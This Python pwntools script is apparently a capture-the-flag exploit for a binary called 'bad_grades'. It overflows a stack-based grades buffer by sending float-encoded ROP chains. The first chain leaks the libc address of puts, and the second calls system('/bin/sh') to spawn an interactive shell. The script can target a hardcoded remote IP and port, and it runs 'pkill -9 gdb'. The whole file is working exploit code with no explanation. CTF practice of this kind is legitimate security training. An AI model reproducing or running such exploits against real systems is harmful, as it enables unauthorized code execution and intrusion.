from pwn import *


def b2h(in_bytes: bytes):
    out_str = ''
    for j in range(math.ceil(len(in_bytes) / 4)):
        out_str += ''.join([str(hex(in_bytes[j*4+3-k]))[2:].rjust(2, '0') for k in range(4)]) + ':'
    return out_str[:-1]


os.system('pkill -9 gdb')
context.terminal = ['tmux', 'splitw', '-h', '-p', '40', '-I']
context.arch = 'amd64'
elf = ELF('bad_grades')
local = True

if local:
    proc = elf.process()
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
    proc = remote('139.59.178.146', 31492)
    context.noptrace = True
    libc = ELF('./libc.so.6')

gdb.attach(proc, '\n'.join([
    # 'b *0x004010f1',  # add_grades nop
    'b *0x004011c1',  # call of add_grades
    'c'
]))


def bytes_to_floats(in_bytes: bytes):
    assert len(in_bytes) % 8 == 0
    floats = []
    for j in range(len(in_bytes) // 8):
        floats.append(struct.unpack('d', in_bytes[j*8:j*8+8])[0])
    return floats


# Initial setup
proc.sendline('2')
proc.recvuntil(b"Number of grades: ")


# Find libc
def find_libc():
    rop = ROP([elf])
    rop.call(elf.plt['puts'], [next(elf.search(b'good'))])
    rop.call(elf.plt['puts'], [elf.got['puts']])
    rop.call(0x004011c1)  # add_grades
    payload = rop.chain()
    payload_floats = bytes_to_floats(payload)

    proc.sendline(str(35 + len(payload) // 8))
    for i in range(33):
        proc.sendline('1')
    proc.sendline('.')
    proc.sendline('2')

    info(f'Sending payload {b2h(payload)}')
    info(f'The floats are {" ".join([str(payload_float) for payload_float in payload_floats])}')

    proc.clean()
    for payload_float in payload_floats:
        proc.sendline(str(payload_float))
    proc.recvuntil(b"Your new average is: ")
    proc.recvuntil('good\n')
    puts = u64(proc.recvline(False).ljust(8, b'\x00'))
    libc.address = puts - libc.symbols['puts']
    info(f'Libc found at {hex(libc.address)}')

# Open shell
def open_shell():
    rop = ROP([libc])
    rop.call(libc.symbols['puts'], [next(libc.search(b'/bin/sh'))])
    rop.call(libc.symbols['system'], [next(libc.search(b'/bin/sh'))])
    payload = rop.chain()
    payload_floats = bytes_to_floats(payload)

    proc.sendline(str(35 + len(payload) // 8))
    for i in range(33):
        proc.sendline('1')
    proc.sendline('.')
    proc.sendline('2')

    info(f'Sending payload {b2h(payload)}')
    info(f'The floats are {" ".join([str(payload_float) for payload_float in payload_floats])}')

    proc.clean()
    for payload_float in payload_floats:
        proc.sendline(str(payload_float))

find_libc()
open_shell()
proc.interactive()
